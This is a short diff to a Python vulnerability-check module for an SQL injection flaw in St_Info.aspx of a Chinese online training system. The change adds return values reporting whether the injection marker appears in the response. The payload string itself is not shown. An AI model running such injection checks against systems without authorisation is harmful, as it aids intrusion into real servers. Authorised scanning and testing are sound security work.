@@ -25,11 +25,14 @@ class tianbo_St_Info_sqli_BaseVerify:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if r"WtFaBcMicrosoft" in req.text:
                 cprint("[+]存在天柏在线培训系统St_Info.aspx SQL注入漏洞...(高危)\tpayload: "+vulnurl, "red")
+                return True, vulnurl, "天柏在线培训系统St_Info.aspx SQL注入", payload, req.text
             else:
                 cprint("[-]不存在tianbo_St_Info_sqli漏洞", "white", "on_grey")
+                return False, None, None, None, None
 
         except:
             cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
+            return False, None, None, None, None
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
